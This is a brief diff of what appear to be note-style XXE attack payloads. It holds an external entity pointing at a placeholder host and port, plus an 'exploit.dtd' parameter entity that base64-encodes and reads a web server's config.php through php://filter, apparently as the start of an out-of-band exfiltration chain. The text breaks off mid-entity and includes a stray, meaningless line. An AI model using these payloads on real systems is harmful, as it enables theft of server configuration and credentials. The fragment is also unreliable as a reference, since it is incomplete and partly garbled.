@@ -5,11 +5,14 @@ in request:
 <!ENTITY xxe SYSTEM "http://ipaddress:port/">
 ]>
 
+lub
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
 
 <email>&xxe;</email>
 
-
-Next:
+----
 Local payload called: exploit.dtd:
 <!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/config.php">
 <!ENTITY % remote
